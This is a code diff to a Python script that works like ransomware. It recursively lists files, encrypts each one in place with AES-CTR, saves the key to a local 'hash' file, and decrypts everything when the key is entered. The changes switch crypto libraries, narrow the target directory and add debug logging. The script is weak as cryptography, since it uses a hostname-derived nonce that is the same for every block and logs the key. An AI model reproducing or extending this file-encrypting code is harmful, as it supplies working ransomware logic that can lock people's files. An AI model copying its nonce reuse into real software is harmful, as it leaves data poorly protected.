@@ -3,21 +3,27 @@ import os
 import hashlib
 import secrets
 import socket
-from Crypto.Util import Counter
-from Crypto.Cipher import AES
+
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+
+
+DEBUG = True
 
 '''
 To create info logs
 '''
 def logInfo(text):
-    print(text)
+    if DEBUG:
+        print(text)
 
 
 '''
 To create error logs
 '''
 def logError(text):
-    print(text)
+    if DEBUG:
+        print("ERROR "+text)
 
 
 '''
@@ -35,6 +41,36 @@ def create_hash():
     #Only want the first 32 characters
     return myhash[:32]
 
+'''
+I create a noncen that will allways be the same in the same host
+Size -> numbers of bytes that the noncen will have
+'''
+def create_noncen(size):
+    futureNoncen = socket.gethostname()
+    futureNoncen = futureNoncen.encode('utf-8')
+
+    #Create a password using the hash encryption sha512
+    noncen = hashlib.sha512(futureNoncen)
+    noncen = noncen.hexdigest()
+    noncen = noncen.encode() #Now, is in bytes
+
+    return noncen[:size]
+
+
+'''
+Mehtod to crypt with the aes algorithm
+
+Key -> the hash password
+Nonce -> a noncen pseudorandom with a seed for each host
+Plaintext -> the text is going to be encrypted/decrypted
+'''
+def crypt_aes(key, nonce, plaintext):
+    cipher = Cipher(algorithms.AES(key), modes.CTR(nonce), backend=default_backend())
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+    print(ciphertext)
+    return ciphertext
+
 
 '''
 Encrypt and decrypt the files
@@ -45,7 +81,7 @@ File -> the name of the file we are going to crypt
 Crypto -> the object that is going to crypt our text
 Size -> the number of bytes that are going to have the blocks that we are going to crypt, every file will be split into blocks
 '''
-def crypt(file, crypto, size):
+def crypt(key, file, size):
     #Binary lecture of the file
     with open(file, 'r+b') as encryptFile:
         content = encryptFile.read(size)
@@ -53,7 +89,7 @@ def crypt(file, crypto, size):
         #This loop works if there is text to crypt
         while content:  
             #Cypt the content and save it in message
-            message = crypto(content)
+            message = crypt_aes(key,create_noncen(size),content)
 
             if len(content) != len(message):
                 #The text before and after being crypt should have the same lenght
@@ -105,7 +141,7 @@ Create a list of files calling the recursive version of this method
 '''
 def files():
     #Call the recursive method to obtain the list of files
-    list_files = files_recursive([],"..")
+    list_files = files_recursive([],".")
 
     logInfo("All the files: "+str(", ".join(list_files)))
 
@@ -137,15 +173,11 @@ def execute():
         if key == input("Enter key: "):
             #If the key is correct all the files are decrypted
             logInfo("key "+str(key))
-
-            #Crypto is an object that will allow the program to decrypt using AES
-            crypto = AES.new(key.encode("utf-8"), AES.MODE_CTR, counter=Counter.new(128))
-            crypto = crypto.decrypt
-            logInfo(crypto)
+            key = key.encode("utf-8")
 
             #Call the crypt method for everyfile
             for file in list_files:
-                crypt(file,crypto,16)
+                crypt(key,file,16)
 
             #Remove the hash file
             os.remove("hash")
@@ -161,20 +193,17 @@ def execute():
         #Create new key
         key = create_hash()
         logInfo("The password: "+str(key))
+        key = key.encode("utf-8")
 
-        #Create an object to encrypt using AES
-        crypto = AES.new(key.encode("utf-8"), AES.MODE_CTR, counter=Counter.new(128))
-        crypto = crypto.encrypt
-        logInfo(crypto)
 
         #Save key in a document
         hash = open("hash", "wb")
-        hash.write(key.encode("utf-8"))
+        hash.write(key)
         hash.close()
 
         #Call the crypt method for everyfile
         for file in list_files:
-            crypt(file,crypto,16)
+            crypt(key,file,16)
 
 
 try:
